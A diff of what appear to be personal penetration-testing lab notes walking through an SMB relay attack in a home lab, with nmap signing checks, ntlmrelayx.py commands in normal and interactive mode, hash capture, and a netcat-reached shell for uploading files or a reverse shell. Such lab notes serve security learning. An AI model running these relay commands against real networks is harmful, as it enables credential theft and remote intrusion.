@@ -48,5 +48,18 @@ syntax: `nmap --script=smb2-security-mode.nse -p445  10.0.2.0/24 | grep "smb2-se
 
 login in to Spiderman machine and create an event:
 try to access a share: 10.0.2.30
-
+syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
+#### We can see the hashes come through. We can either crack these or relay them.  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program.
 ![image](https://user-images.githubusercontent.com/76034874/187008490-680f5243-efc4-4a78-b269-2558b2188c1b.png)
+
+
+Interactive Mode:
+syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
+![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)
+
+now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002
+and we open up to a shell, type 'help' to see a list of commands.  We can upload or download files with get and put.  We could upload our own reverse shell or run any windows command in the ntlmrelay command line.
+
+
+![image](https://user-images.githubusercontent.com/76034874/187008915-957d328a-0bfd-4225-9460-197c51edf5f5.png)
+
